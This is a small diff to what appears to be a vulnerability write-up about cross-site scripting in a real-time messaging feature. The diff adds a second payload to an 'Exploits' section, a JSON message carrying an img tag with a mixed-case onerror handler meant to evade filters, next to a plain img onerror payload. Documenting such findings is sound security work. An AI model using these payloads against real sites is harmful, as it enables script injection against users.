@@ -6,10 +6,13 @@
     * live streaming,  
     * real-time updates,  
     * collaborative editing, and other applications that require instant message delivery.  
-3. Exploit:   
+3. Exploits:   
 
 ```
 <img src=1 onerror='alert(1)'>
+```  
+```  
+{"message":"<img src=42 OnERroR=alert`42`>"}
 ```  
 
 ```
